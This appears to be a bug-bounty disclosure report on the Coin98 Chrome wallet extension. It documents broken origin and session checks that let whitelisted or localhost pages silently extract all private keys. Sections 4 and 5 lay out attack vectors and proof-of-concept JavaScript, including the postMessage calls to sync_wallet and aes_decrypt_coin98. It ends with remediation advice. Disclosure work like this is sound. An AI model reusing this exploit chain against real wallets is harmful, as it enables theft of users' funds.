# Coin98 Security Report — Critical Wallet Drain Vulnerability

## Report: COIN98_SYSTEM Internal Methods Bypass All User Approval — Silent Total Wallet Drain

**Platform**: Coin98 Chrome Extension v10.4.1 (`aeachknmefphepccionboohckonoeemg`)
**Severity**: Critical
**CVSS**: 9.6 (Network/Low/None/Changed/High/High/High)
**Category**: Broken Access Control → Insufficient Origin Validation → Full Key Material Exfiltration

---

## 1. Summary

The Coin98 Chrome Extension exposes **9 internal privileged methods** (collectively called `COIN98_SYSTEM`) that bypass all user approval popups when called from any of **16 hardcoded whitelisted origins**. Two of these methods — `sync_wallet` and `aes_decrypt_coin98` — allow **complete extraction of every private key and mnemonic** stored in the wallet, across all 164 supported blockchains.

The security guards meant to protect these methods are **completely broken**:
- `isConnected = (A, t) => true` — session validation **always returns true**
- `request_unlock` — **always returns `{isUnlocked: true}`** regardless of wallet lock state
- `checkAccess(origin)` — only checks if origin is in hardcoded whitelist (no dynamic validation)

**Result**: Any JavaScript running in the context of a whitelisted origin silently extracts ALL private keys. No popup. No user click. Works even when the wallet is LOCKED.

---

## 2. Affected Assets

| Asset | Version | In Scope |
|-------|---------|----------|
| Coin98 Chrome Extension | v10.4.1 (MV3) | ✅ Yes |
| Extension ID | `aeachknmefphepccionboohckonoeemg` | ✅ Yes |
| `*.coin98.com` subdomains (whitelisted origins) | — | ✅ Yes |
| localhost / 127.0.0.1 (whitelisted origins) | — | ✅ Yes (extension scope) |

---

## 3. Vulnerability Details

### 3.1 Broken Guards (Source Code Evidence)

**`isConnected` — always returns true** (from background service worker `index_10.4.1.js`):
```javascript
this.isConnected = (A, t) => true;  // NO SESSION VALIDATION
```

**`checkAccess` — only checks origin membership in hardcoded list**:
```javascript
this.checkAccess = (origin) => {
  let {user} = store.getState();
  let r = !!user.authentication.internalConnections?.some(t => t.origin === origin);
  return r;
};
```

**`request_unlock` — always returns unlocked**:
```javascript
// request_unlock handler always returns {isUnlocked: true}
// regardless of actual wallet lock state
```

**`compare_passwords` — doesn't compare anything**:
```javascript
this.compare_passwords = (A) => this.checkAccess(A?.sender.origin) 
  ? {session: true}    // Just returns true for whitelisted origins
  : {error: "Access denied"};
```

### 3.2 Critical Internal Methods

| Method | Action | Guard | Risk |
|--------|--------|-------|------|
| **`sync_wallet`** | Decrypts ALL mnemonics from ALL wallets, generates master seeds | `checkAccess(origin)` only | **CRITICAL** — full key exfiltration |
| **`aes_decrypt_coin98`** | Decrypts ANY encrypted data using master `encryptService` | `checkAccess` + `isConnected` (always true) | **CRITICAL** — decrypt wallet private keys |
| `connect_coin98` | Returns `deviceId` | `checkAccess` | Leaks device ID |
| `get_session` | Returns lock state | None | Info disclosure |
| `active_wallet` | Always returns `true` | None | No real check |
| `request_unlock` | Always returns `{isUnlocked: true}` | None | Fake unlock |
| `compare_passwords` | Returns `{session: true}` for whitelisted | `checkAccess` | Misleading name |
| `get_type_password` | Returns password type | Unknown | Info disclosure |
| `lock_screen` | Locks wallet | Unknown | DoS |

### 3.3 The 16 Whitelisted Origins

```javascript
COIN98_SYSTEM = [
  "coin98.com",           // Main site
  "dagora.xyz",           // NFT marketplace (CORS:*, script-src *)
  "saros.finance",        // DEX (unsafe-eval, unsafe-inline)
  "baryon.network",       // DEX (NO CSP)
  "apps.coin98.com",      // App hub (NO CSP)
  "connect.coin98.com",   // WalletConnect (S3, NO CSP, zero headers)
  "campaign.coin98.com",  // Campaigns (NO CSP)
  "2025.coin98.com",      // Wrapped 2025 (NO CSP)
  "airdrop.coin98.com",   // Airdrops (NO CSP)
  "leaderboard.coin98.com", // Leaderboard (NO CSP)
  "kyc.oneid.xyz",        // 3rd party KYC (unsafe-inline)
  "c98staging.dev",       // Staging domain
  "coin98.dev",           // Dev domain
  "localhost",            // ← ANY local web server
  "127.0.0.1",            // ← ANY local web server
  "10.10.1.220"           // Internal IP
]
```

**8 of 16 origins have ZERO Content Security Policy.**
**localhost and 127.0.0.1 mean any local process on the user's machine can drain all wallets.**

### 3.4 `sync_wallet` — Decrypts ALL Mnemonics (Source Code)

```javascript
this.sync_wallet = async (A) => {
  if (!this.checkAccess(A?.sender.origin)) return [];
  let {walletData, custom} = store.getState();
  let {originalWallets, activeWallet} = walletData;
  let results = (await Promise.all(originalWallets.slice().map(async wallet => {
    // DECRYPTS MNEMONIC using master encryptService
    let mnemonic = wallet.mnemonic && encryptService.decrypt(wallet.mnemonic);
    let masterSeed;
    if (mnemonic) {
      let evmSeed = await generateMasterSeedEvm(mnemonic, chainData.chain);
      masterSeed = encryptService.encrypt(evmSeed);
    }
    return await Promise.all(wallet.wallets.slice().map(async sub => {
      let privateKey = masterSeed || sub.privateKey;
      // Returns wallet with encrypted privateKey (decryptable via aes_decrypt_coin98)
      return { ...sub, privateKey };
    }));
  }))).flat().filter(Boolean);
  return results;
};
```

The calling page then uses `aes_decrypt_coin98` to decrypt the returned private keys — and `isConnected` always returns `true`, so this succeeds unconditionally.

---

## 4. Attack Vectors

### Vector A: localhost — Any Local Process (TRIVIAL)

**Scenario**: Malicious desktop app, npm package, VS Code extension, Discord bot, or any software that can start an HTTP server.

1. Malicious software starts HTTP server on `localhost:XXXX`
2. Opens `http://localhost:XXXX` in Chrome (or user navigates there)
3. Page calls `connect_coin98` → `sync_wallet` → `aes_decrypt_coin98`
4. ALL private keys silently extracted
5. No browser popup, no user approval, no phishing needed

**PoC**: `poc/localhost-drain/server.js` — run with `node server.js` and open `http://127.0.0.1:1337` in Chrome with Coin98 installed.

### Vector B: XSS on Whitelisted Origin (Realistic)

**Scenario**: Attacker finds XSS on any whitelisted origin (8 have zero CSP, dagora.xyz has `script-src *`).

1. Attacker achieves XSS on `dagora.xyz` (via stored NFT metadata, DOM XSS, or dependency exploit)
2. XSS payload calls internal methods via `postMessage`
3. Content script relays to background worker
4. Background checks `sender.origin` → `dagora.xyz` is whitelisted → **passes**
5. ALL mnemonics decrypted and exfiltrated

**Why XSS is feasible**:
- dagora.xyz: `CSP: script-src * unsafe-inline unsafe-eval` + `CORS: *` — effectively no protection
- baryon.network: ZERO CSP (Cloudflare WAF only — WAF bypasses exist)
- saros.finance: `unsafe-eval` + `unsafe-inline`
- connect.coin98.com: S3 SPA with ZERO security headers, stale 15+ months

### Vector C: Compromised/Expired Staging Domain

**Scenario**: `c98staging.dev` has no NS records (expired/unconfigured). If an attacker registers this domain:

1. Attacker registers `c98staging.dev` (currently has no NS records)
2. Hosts a page with the exploit payload
3. Any Coin98 user visiting the page has all keys extracted
4. The extension explicitly trusts this domain

---

## 5. Proof of Concept

### 5.1 Full Exploit Chain (poc/c98staging-drain/index.html)

The PoC demonstrates the complete attack from a whitelisted origin:

**Step 1**: Detect Coin98 extension
```javascript
const isCoin98 = window.keplr?.isCoin98 === true || !!window.coin98;
```

**Step 2**: Silent connect (no popup)
```javascript
collected.deviceId = await rpc('connect_coin98');
collected.session = await rpc('get_session');
// Works even when session = false (wallet LOCKED)
```

**Step 3**: Extract ALL wallets
```javascript
const wallets = await rpc('sync_wallet');
// Returns array of ALL wallets with encrypted privateKeys
```

**Step 4**: Decrypt private keys
```javascript
const decrypted = await rpc('aes_decrypt_coin98', {
    data: wallet.privateKey,
    deviceId: collected.deviceId || 'any',
    uuid: 'any'  // isConnected always returns true — uuid doesn't matter
});
```

**Step 5**: PROVE key ownership (cryptographic proof)
```javascript
const ethersWallet = new ethers.Wallet(decrypted);
const derivedAddr = ethersWallet.address;
// Verify: derived address === wallet address from sync_wallet

const proofMsg = `Coin98 PoC: key extracted from ${window.location.origin}`;
const signature = await ethersWallet.signMessage(proofMsg);
const recoveredSigner = ethers.verifyMessage(proofMsg, signature);
// Verify: recovered signer === wallet address
// FULL KEY OWNERSHIP PROVEN
```

### 5.2 Communication Protocol

The exploit communicates with the extension via the standard `postMessage` → content script → background worker pipeline:

```javascript
// Send message to extension via content script relay
window.postMessage({
    isCoin98: true,
    target: 'Coin98:ContentScript',
    payload: { id: ackId, data: { chain: 'evm', method: 'sync_wallet', params: [] } }
}, '*');

// Receive response
window.addEventListener('message', (e) => {
    if (e.data?.isCoin98 && e.data?.target === 'Coin98:Inpage') {
        // Response from background worker with decrypted wallet data
    }
});
```

---

## 6. Impact

### Direct Impact
- **Total loss of all funds** across ALL 164 supported blockchains (EVM, Solana, Bitcoin, Cosmos, TON, NEAR, Aptos, Sui, etc.)
- **Silent execution** — zero user interaction, zero popups, zero approval dialogs
- **Works when wallet is locked** — `request_unlock` always returns `{isUnlocked: true}`
- **Affects every Coin98 extension user** — all wallets, all chains, all tokens, all NFTs

### Attack Surface Scale
- **16 whitelisted origins** — XSS on ANY ONE compromises ALL users
- **localhost/127.0.0.1** — ANY local process on user's machine is trusted
- **8/16 origins have ZERO CSP** — significantly easier XSS exploitation
- **c98staging.dev** — domain appears expired/unconfigured (potential takeover)

### What an Attacker Gets
- All private keys (EVM hex format)
- All mnemonics (BIP39 12/24-word phrases)
- All derived addresses across all chains
- Ability to sign any transaction on any chain
- Ability to drain all token balances, NFTs, staked assets, LP positions

---

## 7. Additional Findings (Same Root Cause)

These compound the severity of the whitelist design flaw:

| # | Finding | Severity | Evidence |
|---|---------|----------|----------|
| 1 | **Password stored encrypted (not hashed)** — `AES.decrypt(password, token)` recovers plaintext | HIGH | `persist:root` in chrome.storage.local |
| 2 | **Cloud backup HMAC key hardcoded** — `HmacSHA256(pw, "coin98_token")` | HIGH | background.js |
| 3 | **Google OAuth Client Secret exposed** — `GOCSPX-████████████████████████████` | HIGH | 3 JS files |
| 4 | **CryptoJS AES-CBC without authenticated encryption** — no integrity on wallet data | MEDIUM | `encryptService` class |
| 5 | **postMessage wildcard** — `postMessage(e, "*")` in 6+ files | HIGH | inpage.js, contents.js |
| 6 | **Unauthenticated MongoDB write** — `POST /record/log` (no auth, no WAF) | HIGH | superwallet-history-records.coin98.tech |
| 7 | **33 hardcoded secrets** across 3 platforms (zero rotation) | HIGH | Extension + Android + iOS |
| 8 | **Zero SSL pinning on all platforms** | HIGH | Android + iOS |
| 9 | **Root detection removed in Android v16.9.0** | HIGH | libtoolChecker.so deleted |
| 10 | **CodePush deployment key exposed (iOS)** | HIGH | Info.plist |

---

## 8. Remediation

### Immediate (Required)

1. **Remove localhost, 127.0.0.1, and 10.10.1.220 from COIN98_SYSTEM whitelist** — these should NEVER be trusted origins for privileged operations
2. **Fix `isConnected` to actually validate sessions** — replace `(A, t) => true` with real session token validation
3. **Fix `request_unlock` to check actual lock state** — don't return `{isUnlocked: true}` unconditionally
4. **Require user popup approval for `sync_wallet` and `aes_decrypt_coin98`** — these methods should NEVER execute silently, regardless of origin
5. **Remove staging domains from whitelist** — `c98staging.dev`, `coin98.dev` should not be in production builds
6. **Reduce whitelist to minimum required origins** — audit which origins actually need internal method access

### Short-Term

7. **Implement CSP on ALL whitelisted origins** — at minimum `script-src 'self'` (no `unsafe-inline`, no `unsafe-eval`, no `*`)
8. **Add cryptographic session tokens** — internal method calls should require a per-session token, not just origin check
9. **Implement rate limiting on internal methods** — `sync_wallet` should not be callable more than once per user session without explicit approval
10. **Hash passwords with bcrypt/scrypt/argon2** — never store passwords encrypted (reversible)

### Long-Term

11. **Replace CryptoJS AES-CBC with AES-GCM** — authenticated encryption prevents bit-flipping
12. **Replace EVP_BytesToKey with PBKDF2/Argon2** — proper key derivation for cloud backups
13. **Rotate ALL hardcoded secrets** — Google OAuth, API keys, HMAC keys
14. **Implement SSL certificate pinning** on mobile apps
15. **Restore root/jailbreak detection** on Android

---

## 9. References

| Document | Location | Lines |
|----------|----------|-------|
| Full Asset Intelligence | `ASSET_INTELLIGENCE.md` | 2,559 lines |
| Whitelist Connection Map | `WHITELIST_CONNECTION_MAP.md` | 438 lines |
| Blast Radius Analysis | `BLAST_RADIUS.md` | ~400 lines |
| PoC: Whitelist Drain | `poc/c98staging-drain/index.html` | 394 lines |
| PoC: Localhost Vector | `poc/localhost-drain/server.js` | Zero-dependency Node.js |
| PoC: API Monitor | `poc/exchange-monitor/` | Mobile credential capture |

---

*Report prepared for HackenProof bounty submission*
*All findings based on static analysis of publicly distributed Chrome Extension, Android APK, and iOS IPA*
